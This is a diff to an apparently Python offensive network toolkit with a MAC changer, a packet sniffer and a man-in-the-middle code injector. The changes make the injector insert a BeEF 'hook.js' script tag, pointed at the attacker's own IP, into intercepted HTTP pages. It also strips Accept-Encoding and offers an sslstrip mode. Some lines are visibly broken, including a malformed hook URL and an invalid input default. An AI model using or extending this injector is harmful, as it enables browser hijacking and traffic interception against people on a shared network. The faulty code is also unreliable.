@@ -7,6 +7,9 @@ import re
 import time
 import sys
 
+PORT = 80
+NIC = "eth0"
+
 # ================================= For mac_changer ========================================
 def gen_mac_address():
     pefix_mac_address_list = ["00:00:0C:", "00:01:42:", "00:01:43:", "00:01:63:", "00:01:64:", "00:01:96:", "00:01:97:", "00:01:C7:", "00:01:C9:"]
@@ -33,13 +36,14 @@ def change_mac(nic, gen_mac):
 
 # THE MAIN FUNCTION TO CHANGE THE MAC-ADDRESS
 def mac_changer():
-    nic = raw_input("Write NIC (example: eth0): ")
+    global NIC
+    NIC = raw_input("Write NIC (example: eth0): ")
     gen_mac = gen_mac_address()
-    current_mac = get_current_mac(nic)
+    current_mac = get_current_mac(NIC)
     print("Current MAC-address is " + str(current_mac))
     if not current_mac == gen_mac:
-        change_mac(nic, gen_mac)
-        current_mac = get_current_mac(nic)
+        change_mac(NIC, gen_mac)
+        current_mac = get_current_mac(NIC)
         if current_mac == gen_mac:
             print("[+++] SUCCESS! MAC-address changed successfully! Your new MAC-address is " + str(current_mac))
         else:
@@ -188,8 +192,6 @@ def traffic_sniffer():
     scapy.sniff(iface=nic, store=False, prn=sniffer_callback)
 # ================================= /For traffic_sniffer ========================================
 # ================================= /For code_injector ========================================
-port = 80
-
 def set_present():
     opt = raw_input(
         "To catch for modify: just transient/all&sslstrip/yours traffic (t/as/y, by default: 'y' or whatever you want for exit): ") | "y"
@@ -223,16 +225,28 @@ def download_callback(packet):
     # TODO
     packet.accept()
 
+def get_current_ip(nic):
+    ifconfig_result = subprocess.check_output(["ifconfig", nic])
+    ip_address_search_result = re.search(r"(?<=inet\s).*(?=\snetmask)", str(ifconfig_result))
+    if ip_address_search_result:
+        return ip_address_search_result.group(0)
+    else:
+        print("[---] ERROR! Could not read the IP-address")
+        sys.exit()
+
+def hack_src(nic):
+    return "http://" + get_current_ip(nic) + "/hook.js:3000"
+
 def inject_callback(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         load = scapy_packet[scapy.Raw].load
-        if scapy_packet[scapy.TCP].dport == port:
+        if scapy_packet[scapy.TCP].dport == PORT:
             # print(scapy_packet.show())
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
-        elif scapy_packet[scapy.TCP].sport == port:
+        elif scapy_packet[scapy.TCP].sport == PORT:
             # print(scapy_packet.show())
-            injection_code = "<script defer src='http://10.0.2.15:3000/hook.js'></script>"
+            injection_code = "<script defer src=" + hack_src(NIC) + "></script>"
             load = load.replace("</head>", injection_code + "</head>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
             if content_length_search and "text/html" in load:
@@ -253,15 +267,17 @@ def callback_switch():
         packet = download_callback
     elif "ic" == opt:
         packet = inject_callback
+        raw_input("===>>> ALERT!!! Make sure you run 'BeEF' before!!! (press any key to continue)")
     return packet
 
 # THE MAIN FUNCTION FOR PACKET MODIFICATION <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 def packet_modificator():
     opt = set_presets()
     if "as" == opt:
-        port = 10000
+        global PORT
+        PORT = 10000
     modifier_callback = callback_switch()
-    if not run_packet:
+    if not modifier_callback:
         modifier_callback = callback_switch()
     try:
         queue = netfilterqueue.NetfilterQueue()
